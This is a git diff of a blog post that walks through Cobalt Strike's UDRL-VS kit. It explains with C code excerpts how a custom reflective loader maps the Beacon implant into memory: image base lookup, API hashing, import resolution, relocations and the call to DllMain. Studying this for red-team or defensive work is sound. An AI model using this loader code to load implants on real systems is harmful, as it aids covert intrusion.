@@ -3,19 +3,6 @@ layout: post
 title: Introduction to Cobalt Strike UDRL-VS
 ---
 
-
-# UDRL-VS
----
-
-The User-Defined Reflective Loader Visual Studio is one of the latest additions to the Cobalt Strike Arsenal Kit. It is supposed to help red team operators with the development of their own UDRL and lower the barrier of entry for dev & debugging custom reflective loaders. 
-
-<figure>
-  <img src="../assets/udrl-vs/udrl-directory.png" alt="example udrl starting directory" width="100%"/>
-  <figcaption><i>Fig.1 - Example UDRL-VS Starting Directory.</i></figcaption>
-</figure>
-
-As you can see from the screenshot, a nice pre-built UDRL project is created for you to jumpstart into the development and debugging in Visual Studio.
-<!-- 
 # Reflective Loading vs Native Windows DLL Loading?
 ---
 
@@ -38,7 +25,7 @@ The following is an example of how you could load a CS Beacon using Native Windo
 
 <figure>
   <img src="../assets/udrl-vs/badtime-meme.jpg" alt="OPSEC Unsafe meme" width="75%"/>
-  <figcaption><i>Fig.2 - OPSEC Warning.</i></figcaption>
+  <figcaption><i>Fig.1 - OPSEC Warning.</i></figcaption>
 </figure>
 <br>
 
@@ -87,7 +74,7 @@ Compiling the code and executing it on a victim machine will give us the followi
 
 <figure>
   <img src="../assets/udrl-vs/BeaconLoader-WinDLL.png" alt="Executing the loader" width="100%"/>
-  <figcaption><i>Fig.3 - Executing the loader.</i></figcaption>
+  <figcaption><i>Fig.2 - Executing the loader.</i></figcaption>
 </figure>
 
 ## Reflective Loader
@@ -106,7 +93,7 @@ In general the project does a couple of things to reflectively load the DLL:
 8. The ReflectiveLoader starts the library's main function, DllMain, with a command called DLL_PROCESS_ATTACH. This means the library is now fully loaded in memory.
 9. In the end, control goes back to the initial code that started the ReflectiveLoader. If it was started with CreateRemoteThread, that thread ends.
 
-If you don't fully understand this part, I highly recommend the [Sektor7 course Malware Development: Intermediate Course](https://institute.sektor7.net/rto-maldev-intermediate). [Reenz0h](https://twitter.com/reenz0h) explains the concept very well and provides you with additional code snippets. -->
+If you don't fully understand this part, I highly recommend the [Sektor7 course Malware Development: Intermediate Course](https://institute.sektor7.net/rto-maldev-intermediate). [Reenz0h](https://twitter.com/reenz0h) explains the concept very well and provides you with additional code snippets.
 
 # Cobalt Strike UDRL
 ---
@@ -114,20 +101,31 @@ If you don't fully understand this part, I highly recommend the [Sektor7 course 
 So now that we know, high-level, what is needed to reflectively load a DLL into memory using the RDI technique. How does Cobalt Strike's UDRL work and how can we customize it?
 
 1. [ReflectiveLoader Function](#reflective-loader-function): This is the main function that handles the reflective loading process.
-    - It determines the target DLL's base address and NT header.
-    - It locates essential functions like LoadLibraryA, GetProcAddress, and VirtualAlloc.
-    - It allocates memory for the DLL, copies its headers and sections, resolves its imports, processes relocations, and finds its entry point.
-    - The function ends by calling the DLL's entry point and then returns the entry point's address.
 
-2. FindImageBase Function: Determines the base address of the target DLL. Depending on the build configuration, it uses different methods to find this address.
+2. [FindImageBase Function](#findimagebase): Determines the base address of the target DLL. Depending on the build configuration, it uses different methods to find this address.
 
-3. AllocateMemory Function: Allocates memory for the target DLL. It determines the size needed based on the DLL's NT header and uses the VirtualAlloc function to reserve and commit the required memory.
+3. [AllocateMemory Function](#allocatememory): Allocates memory for the target DLL. It determines the size needed based on the DLL's NT header and uses the VirtualAlloc function to reserve and commit the required memory.
 
-4. CopyHeadersAndSections Function: Copies the headers and sections of the target DLL from its current location to the newly allocated memory.
+4. [CopyHeadersAndSections Function](#copyheadersandsections): Copies the headers and sections of the target DLL from its current location to the newly allocated memory.
 
-5. ResolveImports Function: Handles the resolution of the DLL's imports. It goes through the import table, loads required modules using LoadLibraryA, and resolves function addresses using GetProcAddress.
+5. [ResolveImports Function](#resolveimports): Handles the resolution of the DLL's imports. It goes through the import table, loads required modules using LoadLibraryA, and resolves function addresses using GetProcAddress.
 
-6. ProcessRelocations Function: Adjusts addresses in the DLL based on its new location in memory. It calculates the difference between the DLL's original base address and its new address, then updates relevant addresses in the DLL to reflect its new location.
+6. [ProcessRelocations Function](#processrelocations): Adjusts addresses in the DLL based on its new location in memory. It calculates the difference between the DLL's original base address and its new address, then updates relevant addresses in the DLL to reflect its new location.
+
+
+# UDRL-VS
+---
+
+The User-Defined Reflective Loader Visual Studio kit is one of the latest additions to the Cobalt Strike Arsenal . It is supposed to help red team operators with the development of their own UDRL and lower the barrier of entry for dev & debugging custom reflective loaders. 
+
+<figure>
+  <img src="../assets/udrl-vs/udrl-directory.png" alt="example udrl starting directory" width="100%"/>
+  <figcaption><i>Fig.3 - Example UDRL-VS Starting Directory.</i></figcaption>
+</figure>
+
+As you can see from the screenshot, a nice pre-built UDRL project is created for you to jumpstart into the development and debugging in Visual Studio. Since we already went over the UDRL we can jump right into testing the new kit.
+
+
 
 ## ReflectiveLoader()
 
@@ -150,7 +148,7 @@ extern "C" {
 }
 ```
 
-### FindImageBase()
+## FindImageBase()
 In this code snippet we can see the `FindImageBase()` which will, depending on the configuration, use a different directive. The main gist is that we calculate the beacons base address here and find the NT headers, like Stephen did in the RDI project.
 
 To give an overview on how it does this on what the DOS & NT headers look like we can see it in WinDbg using the following commands (open any executable), and look for the base address of any loaded module:
@@ -166,7 +164,7 @@ x *!ReflectiveLoader*
 
 <figure>
   <img src="../assets/udrl-vs/windbg1.png" alt="WinDbg output of the DOS headers" width="100%"/>
-  <figcaption><i>Fig.5 - WinDbg output of the DOS headers of ntdll.dll .</i></figcaption>
+  <figcaption><i>Fig.4 - WinDbg output of the DOS headers of ntdll.dll .</i></figcaption>
 </figure>
 
 Using this output we can calculate the NT headers: 
@@ -181,10 +179,10 @@ Using this output we can calculate the NT headers:
 
 <figure>
   <img src="../assets/udrl-vs/windbg2.png" alt="WinDbg output of the NT headers" width="100%"/>
-  <figcaption><i>Fig.6 - WinDbg output of the NT headers of ntdll.dll .</i></figcaption>
+  <figcaption><i>Fig.5 - WinDbg output of the NT headers of ntdll.dll .</i></figcaption>
 </figure>
 
-### Resolving Functions
+## Resolving Functions
 
 The following snippet is focused on determining the necessary functions that the loader requires to function.
 
@@ -236,7 +234,7 @@ The loader attempts to resolve key functions using the `GetProcAddressByHash()` 
     }
 ```
 
-### PRINT() & Strings
+## PRINT() & Strings
 
 A very nice addition by the dev team is that they included a way to output strings to be used as a part of the debugging process. Normally strings are stored in the .data/.rdata section but since our UDRL exclusively lives in the .text section, we won't have access to these strings.
 
@@ -255,7 +253,7 @@ PIC_STRING(example, "[!] Hello, World!\n");
 PRINT(example);
 ```
 
-### AllocateMemory()
+## AllocateMemory()
 
 To be able to move our DLL into the process we need to allocate some memory. If the allocation is successful we get the base address of the new memory block.
 
@@ -293,7 +291,7 @@ ULONG_PTR AllocateMemory(PIMAGE_NT_HEADERS ntHeader, PWINDOWSAPIS winApi) {
 }
 ```
 
-### CopyHeadersAndSections()
+## CopyHeadersAndSections()
 
 After allocating a memory block and getting a pointer to the new base address, we should be ready to move our image (or DLL) sections & headers into it. 
 
@@ -304,7 +302,7 @@ CopyHeadersAndSections(beaconBaseAddress, newBeaconBaseAddress);
 
 Delving into this function just reveals it overwriting the allocated space with headers & sections.
 
-### ResolveImports()
+## ResolveImports()
 
 This function is designed to manually resolve the imports of a DLL that has been loaded into memory, making sure that it can correctly calls functions from other DLLs it depends on.
 
@@ -407,13 +405,133 @@ while (importDescriptor->Name) {
 <br>The IAT is an array of pointers in the PE file. Each pointer points to an imported function. As the code resolves each imported function, it updates the corresponding entry in the IAT with the function's address.
 
 
+## ProcessRelocations()
 
-
-
+This function is designed for processing the relocations of a PE (Portable Executable) file. Relocations are essential when a PE file is loaded at a different base address than its preferred base address. This can happen when the preferred base address is already occupied by another module or when the PE file is being loaded in a non-standard way (e.g., during manual mapping).
 
 ```c
-
+// STEP 5: process all of our image's relocations...
+ProcessRelocations(beaconBaseAddress, newBeaconBaseAddress);
 ```
+
+<br>Let's break it down, stepping into the function. 
+
+First of we need the headers of the PE file, we can find the DOS header which has a field `e_lfanew` that points to the NT headers. We need the NT header to be able to calculate the delta between the PE's preferred base address and the address where it is actually loaded.
+
+With the delta in mind, we can adjust the addresses in the PE file.
+
+```c
+PRINT("[*] Processing relocations... \n");
+PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(srcAddress + ((PIMAGE_DOS_HEADER)srcAddress)->e_lfanew);
+
+// calculate the base address delta
+ULONG_PTR delta = dstAddress - ntHeader->OptionalHeader.ImageBase;
+PRINT("[+] Delta: 0x%X \n", delta);
+```
+
+<br>The PE's optional header contains an array of the data directories. One of these directories, `IMAGE_DIRECTORY_ENTRY_BASERELOC`, points to the [relocation table](https://docs.oracle.com/cd/E19455-01/806-3773/elf-5/index.html#:~:text=Locations%20represent%20addresses%20in%20memory,addresses%20by%20the%20link%20editor.). 
+
+```c
+PIMAGE_DATA_DIRECTORY relocDataDirectoryEntry = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+```
+
+<br>The relocation table consists of a series of relocation blocks. Each block contains a series of individual relocations that need to be applied. The code iterates over these blocks.
+
+For each relocation in a block, the code adjusts an address in the PE file based on the type of the relocation. The most common types are:
+
+- IMAGE_REL_BASED_DIR64: For 64-bit addresses.
+- IMAGE_REL_BASED_HIGHLOW: For 32-bit addresses.
+- IMAGE_REL_BASED_HIGH: Adjusts the high 16 bits of a 32-bit address.
+- IMAGE_REL_BASED_LOW: Adjusts the low 16 bits of a 32-bit address.
+
+The code uses the delta calculated earlier to adjust these addresses.
+
+**IMPORTANT:** the kit itself already mentions it, but it is important that you don't use a switch statement here. This will instruct the compiler to build a jump table which is not position independant since it will introduce absolute addresses.
+
+```c
+// check if there are any relocations present
+if ((relocDataDirectoryEntry)->Size) {
+    // baseRelocation is the first entry (IMAGE_BASE_RELOCATION)
+    PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(dstAddress + relocDataDirectoryEntry->VirtualAddress);
+    PRINT("[*] Base Relocation: %p\n", baseRelocation);
+
+    // itterate through all entries...
+    while (baseRelocation->SizeOfBlock) {
+        // relocationBlock = the VA for this relocation block
+        ULONG_PTR relocationBlock = (dstAddress + baseRelocation->VirtualAddress);
+        PRINT("\t[*] Relocation Block: %p\n", relocationBlock);
+
+        // relocationCount = number of entries in this relocation block
+        ULONG_PTR relocationCount = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
+
+        // relocation is the first entry in the current relocation block
+        PIMAGE_RELOC relocation = (PIMAGE_RELOC)((ULONG_PTR)baseRelocation + sizeof(IMAGE_BASE_RELOCATION));
+
+        // we itterate through all the entries in the current block...
+        while (relocationCount--) {
+            /**
+            * PRINT("\t\t[*] Relocation - type: %x offset: %x\n", ((PIMAGE_RELOC)relocation)->type, ((PIMAGE_RELOC)relocation)->offset);
+            * perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
+            * we dont use a switch statement to avoid the compiler building a jump table
+            * which would not be very position independent!
+            */
+            if ((relocation)->type == IMAGE_REL_BASED_DIR64)
+                *(ULONG_PTR*)(relocationBlock + relocation->offset) += delta;
+            else if (relocation->type == IMAGE_REL_BASED_HIGHLOW)
+                *(DWORD*)(relocationBlock + relocation->offset) += (DWORD)delta;
+            else if (relocation->type == IMAGE_REL_BASED_HIGH)
+                *(WORD*)(relocationBlock + relocation->offset) += HIWORD(delta);
+            else if (relocation->type == IMAGE_REL_BASED_LOW)
+                *(WORD*)(relocationBlock + relocation->offset) += LOWORD(delta);
+            // get the next entry in the current relocation block
+            relocation++;
+        }
+        // get the next entry in the relocation directory
+        baseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)baseRelocation + baseRelocation->SizeOfBlock);
+    }
+}
+```
+
+## Return the Entry Point
+
+Finally, after the relocations were successful, we can find and return the entry point. 
+
+<br>1. **Calculate the entry point**: this is the address of the `DllMain` function. The `AddressOfEntryPoint` is an offset from the base address of the DLL to its entry point.
+
+```c
+// STEP 6: find our image's entry point
+ULONG_PTR entryPoint = newBeaconBaseAddress + beaconNtHeader->OptionalHeader.AddressOfEntryPoint;
+PRINT("[+] Entry point: %p \n", entryPoint);
+```
+
+<br>2. **Flush the instruction cache**: it's essential to ensure that the CPU's instruction cache doesn't contain any stale or outdated instructions.
+
+```c
+/** 
+    * STEP 7: call our image's entry point
+    * We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
+*/
+winApi.NtFlushInstructionCache((HANDLE)-1, NULL, 0);
+```
+
+<br>3. **Execute the DLL's Entry Point**: The DLL's entry point (DllMain function) is called twice. The first call uses the DLL_PROCESS_ATTACH flag, which is standard when a DLL is first loaded into a process. The purpose of the second call with the flag 4 is not standard and might be specific to the "Beacon" or the context in which this code is used.
+
+```c
+// call DllMain twice to ensure that Beacon is set up correctly.
+PRINT("[*] Executing Beacon\n");
+((DLLMAIN)entryPoint)((HINSTANCE)newBeaconBaseAddress, DLL_PROCESS_ATTACH, NULL);
+((DLLMAIN)entryPoint)((HINSTANCE)beaconBaseAddress, 4, NULL);
+```
+
+<br>4. **Return the Entry Point Address**: The function returns the address of the DLL's entry point. This allows the caller to potentially call the DllMain function again if needed.
+
+```c
+// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
+return entryPoint;
+```
+
+
+
 
 
 # Sources
